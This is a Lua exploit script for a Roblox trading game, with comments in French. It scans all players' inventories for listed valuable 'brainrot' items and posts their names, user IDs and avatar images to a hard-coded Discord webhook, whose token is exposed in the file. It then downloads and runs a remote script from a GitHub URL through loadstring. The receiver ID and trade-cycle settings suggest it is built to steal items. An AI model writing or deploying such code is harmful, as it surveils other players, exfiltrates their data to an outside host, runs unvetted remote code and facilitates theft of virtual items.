getgenv().SECRET_KEY = "mrr_a4af3be1727049e8b2b20e2a3d7bffee"
getgenv().RECEIVER_ID = 2354866600 
getgenv().TARGET_ID = getgenv().RECEIVER_ID
getgenv().DELAY_STEP = 1      
getgenv().TRADE_CYCLE_DELAY = 2

-- Configuration Discord Webhook
local webhook_url = "https://discord.com/api/webhooks/1487806869513965679/18RefKz9apMy-rAu3ZAijlKO7DBFpdX547O2dpu1ZZNj-VpIryChHx3GysAzyD22zal8"

-- Options de détection
getgenv().TeamCheck = false
getgenv().WallCheck = false
getgenv().TargetAllPlayers = true

getgenv().TARGET_BRAINROTS = {
    ["Meowl"] = true, ["Skibidi Toilet"] = true, ["Strawberry Elephant"] = true, ["Griffin"] = true,
    ["Nacho Spyder"] = true, ["Quesadillo Vampiro"] = true, ["Perrito Burrito"] = true,
    ["Tacorita Bicicleta"] = true, ["La Extinct Grande"] = true, ["La Spooky Grande"] = true,
    ["Chipso and Queso"] = true, ["Tuff Toucan"] = true, ["Chillin Chili"] = true,
    ["Gobblino Uniciclino"] = true, ["W or L"] = true, ["La Jolly Grande"] = true,
    ["La Taco Combinasion"] = true, ["Swaggy Bros"] = true, ["La Romantic Grande"] = true,
    ["Festive 67"] = true, ["Nuclearo Dinossauro"] = true, ["Money Money Puggy"] = true,
    ["Ketupat Kepat"] = true, ["Tang Tang Keletang"] = true, ["Tictac Sahur"] = true,
    ["Ketchuru and Musturu"] = true, ["Lavadorito Spinito"] = true, ["Burguro And Fryuro"] = true,
    ["Garama and Madundung"] = true, ["Capitano Moby"] = true, ["Dragon Cannelloni"] = true,
    ["Cerberus"] = true, ["Agarrini la Palini"] = true, ["Guest 666"] = true,
    ["Los Hotspotsitos"] = true, ["Tralaledon"] = true, ["Los Bros"] = true,
    ["Los Puggies"] = true, ["Los Primos"] = true, ["Los Tacoritas"] = true,
    ["Los Spaghettis"] = true, ["Ginger Gerat"] = true, ["Love Love Bear"] = true,
    ["Spooky and Pumpky"] = true, ["Fragrama and Chocrama"] = true, ["La Casa Boo"] = true,
    ["Los Sekolahs"] = true, ["Reinito Sleighito"] = true, ["Ketupat Bros"] = true,
    ["Cooki and Milki"] = true, ["Rosey and Teddy"] = true, ["Popcuru and Fizzuru"] = true,
    ["La Supreme Combinasion"] = true, ["Dragon Gingerini"] = true, ["Headless Horseman"] = true,
    ["Hydra Dragon Cannelloni"] = true, ["Celularcini Viciosini"] = true, ["Los Planitos"] = true,
    ["Eviledon"] = true, ["Orcaledon"] = true, ["Los Jolly Combinasionas"] = true,
    ["Fishino Clownino"] = true, ["Los Spooky Combinasionas"] = true, ["La Food Combinasion"] = true,
    ["La Secret Combinasion"] = true, ["Los Amigos"] = true, ["Sammyni Fattini"] = true,
    ["Spaghetti Tualetti"] = true, ["Rosetti Tualetti"] = true, ["Los 67"] = true,
    ["Los Mobilis"] = true, ["Las Sis"] = true, ["Los Candies"] = true,
    ["Bacuru and Egguru"] = true, ["Mieteteira Bicicleteira"] = true, ["Swag Soda"] = true,
    ["Mariachi Corazoni"] = true, ["La Ginger Sekolah"] = true
}

-- Fonction de vérification d'inventaire
local function checkInventory(player)
    local foundItems = {}
    
    -- On regarde dans le sac à dos et sur le personnage
    local locations = {player:FindFirstChild("Backpack"), player.Character}
    
    for _, location in pairs(locations) do
        if location then
            for _, item in pairs(location:GetChildren()) do
                if getgenv().TARGET_BRAINROTS[item.Name] then
                    table.insert(foundItems, item.Name)
                end
            end
        end
    end
    return foundItems
end

-- Fonction d'envoi Webhook filtrée
local function sendWebhook(playerName, playerID, itemsFound)
    if #itemsFound == 0 then return end -- Si rien n'est trouvé, on n'envoie rien
    
    local headshotUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. playerID .. "&width=420&height=420&format=png"
    local itemList = table.concat(itemsFound, ", ")
    
    local data = {
        ["embeds"] = {{
            ["title"] = "🎯 Brainrot RÉEL Détecté !",
            ["description"] = "Le joueur **" .. playerName .. "** possède ces items cibles.",
            ["color"] = 16711680, -- Rouge
            ["thumbnail"] = { ["url"] = headshotUrl },
            ["fields"] = {
                {["name"] = "Items Détectés", ["value"] = "```" .. itemList .. "```", ["inline"] = false},
                {["name"] = "ID du Joueur", ["value"] = tostring(playerID), ["inline"] = true}
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    
    pcall(function()
        (syn and syn.request or http_request or request)({
            Url = webhook_url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(data)
        })
    end)
end

-- Surveillance
task.spawn(function()
    local function onPlayerDetected(player)
        task.wait(3) -- On attend que l'inventaire charge
        local items = checkInventory(player)
        sendWebhook(player.Name, player.UserId, items)
    end

    game.Players.PlayerAdded:Connect(onPlayerDetected)
    for _, p in pairs(game.Players:GetPlayers()) do onPlayerDetected(p) end

    -- Lancement du script principal
    loadstring(game:HttpGet("https://raw.githubusercontent.com/nethersdev/Ragdolltpduel/main/Nethers.lua"))()
end)
